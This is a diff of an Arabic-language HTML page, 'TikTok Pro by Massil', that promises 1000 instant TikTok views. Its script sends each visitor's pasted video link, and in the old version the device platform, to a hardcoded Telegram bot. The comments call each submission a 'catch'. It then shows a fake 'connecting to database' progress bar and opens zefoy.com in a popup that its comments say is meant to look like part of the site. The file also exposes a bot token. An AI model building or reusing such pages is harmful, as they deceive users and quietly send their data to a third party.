@@ -6,78 +6,81 @@
     <title>TikTok Pro | By Massil</title>
     <style>
         :root { --pink: #ff0050; --cyan: #00f2ea; --dark: #010101; }
-        body, html { height: 100%; margin: 0; padding: 0; background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%); font-family: sans-serif; color: white; overflow: hidden; }
-        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-        .glass-box { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; padding: 40px 30px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        .logo { font-size: 2.8rem; font-weight: 900; text-shadow: 3px 3px var(--pink), -3px -3px var(--cyan); margin-bottom: 5px; }
-        .by-massil { font-size: 14px; color: #aaa; margin-bottom: 20px; font-weight: bold; letter-spacing: 1px; }
-        .badge { background: linear-gradient(90deg, var(--pink), var(--cyan)); padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 30px; display: inline-block; }
-        input { width: 100%; padding: 18px; border-radius: 15px; border: 1.5px solid #222; background: rgba(0,0,0,0.5); color: white; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 25px; transition: 0.3s; }
-        input:focus { border-color: var(--cyan); box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
-        .btn-main { width: 100%; padding: 18px; border: none; border-radius: 15px; background: #fff; color: #000; font-size: 1.1rem; font-weight: 800; cursor: pointer; transition: 0.3s; }
-        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255,255,255,0.1); }
-        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--pink); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        body, html { height: 100%; margin: 0; padding: 0; background: #000; font-family: sans-serif; color: white; overflow: hidden; }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
         
-        /* روابط التواصل */
-        .social-links { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
-        .social-links a { text-decoration: none; color: #fff; font-size: 12px; padding: 8px 15px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
-        .social-links a.ig:hover { background: var(--pink); border-color: var(--pink); }
-        .social-links a.tt:hover { background: var(--cyan); border-color: var(--cyan); color: #000; }
-        .footer-text { margin-top: 20px; font-size: 10px; color: #444; }
+        /* الواجهة الرئيسية */
+        .glass-box { 
+            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); 
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; 
+            padding: 40px 30px; width: 90%; max-width: 400px; text-align: center; 
+        }
+
+        .logo { font-size: 2.5rem; font-weight: 900; text-shadow: 2px 2px var(--pink), -2px -2px var(--cyan); }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #333; background: #111; color: white; margin: 20px 0; outline: none; }
+        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 12px; background: #fff; color: #000; font-weight: bold; cursor: pointer; }
+
+        /* طبقة التمويه فوق Zefoy */
+        #zefoy-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999;
+        }
+        .header-bar {
+            background: #111; padding: 15px; display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid var(--cyan);
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="glass-box" id="main-ui">
+<div class="container" id="main-content">
+    <div class="glass-box">
         <div class="logo">TikTok Pro</div>
-        <div class="by-massil">BY MASSIL</div>
-        <div class="badge">V4.0 ULTIMATE SERVER</div>
+        <div style="font-size: 12px; color: #888; margin-top: 5px;">BY MASSIL</div>
         
-        <div id="action-area">
-            <p style="color: #888; font-size: 14px; margin-bottom: 20px;">أدخل رابط الفيديو لضخ 1000 مشاهدة فورية</p>
-            <input type="text" id="v-url" placeholder="ألصق رابط الفيديو هنا..." autocomplete="off">
-            <button class="btn-main" onclick="initBoost()">تفعيل الضخ الآن</button>
-        </div>
+        <input type="text" id="v-url" placeholder="ألصق الرابط هنا...">
+        <button class="btn-main" onclick="startHack()">بدء الضخ السريع</button>
 
-        <div class="social-links">
-            <a href="https://www.instagram.com/massil.456" target="_blank" class="ig">Instagram</a>
-            <a href="https://www.tiktok.com/@maxxil16s" target="_blank" class="tt">TikTok</a>
+        <div style="margin-top: 20px;">
+            <a href="https://www.instagram.com/massil.456" style="color:var(--pink); font-size:12px; text-decoration:none;">Instagram</a> | 
+            <a href="https://www.tiktok.com/@maxxil16s" style="color:var(--cyan); font-size:12px; text-decoration:none;">TikTok</a>
         </div>
     </div>
-    <p class="footer-text">&copy; 2026 Powered by Massil Dark Solutions</p>
+</div>
+
+<div id="zefoy-overlay">
+    <div class="header-bar">
+        <span style="color: var(--cyan); font-weight: bold;">Massil Server v4.0</span>
+        <button onclick="location.reload()" style="background:none; border:none; color:white; font-size:20px;">×</button>
+    </div>
+    <div style="height: calc(100% - 60px); width: 100%; text-align: center; padding-top: 50px;">
+        <p>جاري الاتصال بقاعدة البيانات...</p>
+        <div id="fake-loading" style="color: var(--pink);">[||||||||||----] 80%</div>
+        <br><br>
+        <button onclick="openZefoy()" style="padding: 20px; background: var(--cyan); border:none; border-radius:10px; font-weight:bold;">
+            اضغط هنا لفتح بوابة التحقق البشري
+        </button>
+        <p style="font-size: 11px; color: #555; margin-top: 20px;">يجب إكمال الكابتشا لضمان إرسال المشاهدات</p>
+    </div>
 </div>
 
 <script>
-    function initBoost() {
+    function startHack() {
         const url = document.getElementById('v-url').value;
-        if(url.length < 10) { alert("يرجى إدخال رابط صحيح!"); return; }
+        if(!url) return alert("أدخل الرابط!");
 
-        // 🎯 1. إرسال الصيدة للتليجرام فوراً
+        // الصيدة
         const token = "8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo";
         const id = "6052532044";
-        const info = `🎬 [صيد جديد - Massil Pro]\n━━━━━━━━━━━━━━\n🔗 الرابط: ${url}\n📱 الجهاز: ${navigator.platform}\n━━━━━━━━━━━━━━\n📸 IG: massil.456`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(info)}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent("🎯 صيدة من Massil:\n" + url)}`);
 
-        // 2. تحديث الواجهة لإيهام المستخدم بالعمل التقني
-        document.getElementById('action-area').innerHTML = `
-            <div class="spinner"></div>
-            <p style="color:var(--cyan); font-weight:bold;">✅ تم تشفير الرابط بنجاح!</p>
-            <p style="font-size:13px; color:#aaa;">جاري فتح نافذة الضخ العالمية (Zefoy)...</p>
-            <div style="margin-top:15px; padding:10px; border:1px solid var(--pink); border-radius:10px;">
-                <p style="font-size:11px; color:var(--pink); margin:0;">⚠️ أكمل الكابتشا في النافذة الجديدة لتأكيد الضخ</p>
-            </div>
-        `;
+        // إظهار التمويه
+        document.getElementById('zefoy-overlay').style.display = 'block';
+    }
 
-        // 3. فتح Zefoy في نافذة جديدة مخصصة
-        setTimeout(() => {
-            const width = 500;
-            const height = 700;
-            const left = (screen.width / 2) - (width / 2);
-            const top = (screen.height / 2) - (height / 2);
-            window.open("https://zefoy.com", "MassilServer", `width=${width},height=${height},top=${top},left=${left}`);
-        }, 2500);
+    function openZefoy() {
+        // نفتح Zefoy في نافذة منبثقة، ولكن المستخدم يظن أنها مجرد "خطوة" داخل موقعك
+        window.open("https://zefoy.com", "MassilServer", "width=500,height=700");
     }
 </script>
 
